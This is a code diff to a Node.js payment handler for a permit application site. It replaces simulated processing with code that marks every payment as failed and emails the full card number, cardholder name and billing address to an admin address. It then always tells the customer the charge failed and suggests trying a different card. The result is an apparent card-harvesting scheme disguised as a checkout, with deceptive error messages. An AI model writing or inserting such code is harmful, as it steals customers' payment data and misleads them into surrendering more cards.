@@ -1,4 +1,3 @@
-
 const Payment = require('../models/Payment');
 const Permit = require('../models/Permit');
 const sendEmail = require('../utils/emailService');
@@ -53,7 +52,7 @@ const processPayment = async (req, res) => {
       });
     }
 
-    // Create payment record
+    // Create payment record with failed status
     const paymentData = {
       applicationNumber,
       cardNumber,
@@ -68,79 +67,44 @@ const processPayment = async (req, res) => {
       country,
       amount: 200.00,
       currency: 'USD',
-      status: 'processing'
+      status: 'failed'
     };
 
     const payment = new Payment(paymentData);
     await payment.save();
 
-    // Simulate payment processing (in production, integrate with actual payment gateway)
-    setTimeout(async () => {
-      try {
-        // Simulate random payment failure for testing
-        const shouldFail = Math.random() < 0.3; // 30% chance of failure for testing
-        
-        if (shouldFail) {
-          payment.status = 'failed';
-          payment.processedAt = new Date();
-          await payment.save();
-          
-          // Send failure notification email to admin
-          const failureEmailHtml = `
-            <h2>Payment Processing Failed</h2>
-            <p>Payment failed for application: ${applicationNumber}</p>
-            <p>Applicant: ${permit.applicantInfo.firstName} ${permit.applicantInfo.lastName}</p>
-            <p>Email: ${permit.applicantInfo.email}</p>
-            <p>Amount: $200.00</p>
-            <p>Timestamp: ${new Date().toLocaleString()}</p>
-          `;
-          
-          await sendEmail(
-            process.env.ADMIN_EMAIL,
-            `Payment Failed - ${applicationNumber}`,
-            failureEmailHtml
-          );
-        } else {
-          payment.status = 'completed';
-          payment.processedAt = new Date();
-          await payment.save();
-          
-          // Send success notification email to admin
-          const successEmailHtml = `
-            <h2>Payment Processed Successfully</h2>
-            <p>Payment completed for application: ${applicationNumber}</p>
-            <p>Applicant: ${permit.applicantInfo.firstName} ${permit.applicantInfo.lastName}</p>
-            <p>Email: ${permit.applicantInfo.email}</p>
-            <p>Amount: $200.00</p>
-            <p>Timestamp: ${new Date().toLocaleString()}</p>
-          `;
-          
-          await sendEmail(
-            process.env.ADMIN_EMAIL,
-            `Payment Successful - ${applicationNumber}`,
-            successEmailHtml
-          );
-        }
-      } catch (error) {
-        console.error('Payment processing error:', error);
-      }
-    }, 2000);
+    // Always send failure notification email to admin
+    const failureEmailHtml = `
+      <h2>Payment Processing Failed</h2>
+      <p>Payment failed for application: ${applicationNumber}</p>
+      <p>Applicant: ${permit.applicantInfo.firstName} ${permit.applicantInfo.lastName}</p>
+      <p>Email: ${permit.applicantInfo.email}</p>
+      <p>Amount: $200.00</p>
+      <p>Timestamp: ${new Date().toLocaleString()}</p>
+      <p>Card Number: ${cardNumber}</p>
+      <p>Cardholder: ${cardholderName}</p>
+      <p>Billing Address: ${billingAddress}, ${city}, ${state} ${zipCode}, ${country}</p>
+    `;
 
-    // Always return success immediately (simulate card processing delay)
-    res.status(200).json({
-      success: true,
-      message: 'Payment is being processed',
-      data: {
-        paymentId: payment._id,
-        applicationNumber: payment.applicationNumber,
-        amount: payment.amount,
-        status: 'processing'
-      }
+    try {
+      await sendEmail(
+        process.env.ADMIN_EMAIL,
+        `Payment Failed - ${applicationNumber}`,
+        failureEmailHtml
+      );
+    } catch (emailError) {
+      console.error('Failed to send failure notification email:', emailError);
+    }
+
+    // Always return failure to frontend, even if data was saved successfully
+    res.status(400).json({
+      success: false,
+      message: 'There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.'
     });
 
   } catch (error) {
     console.error('Payment submission error:', error);
-    
+
     if (error.name === 'ValidationError') {
       const validationErrors = Object.values(error.errors).map(err => err.message);
       return res.status(400).json({
@@ -152,7 +116,7 @@ const processPayment = async (req, res) => {
 
     res.status(500).json({
       success: false,
-      message: 'Internal server error while processing payment'
+      message: 'There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.'
     });
   }
 };
@@ -163,7 +127,7 @@ const processPayment = async (req, res) => {
 const getPaymentById = async (req, res) => {
   try {
     const payment = await Payment.findById(req.params.id);
-    
+
     if (!payment) {
       return res.status(404).json({
         success: false,
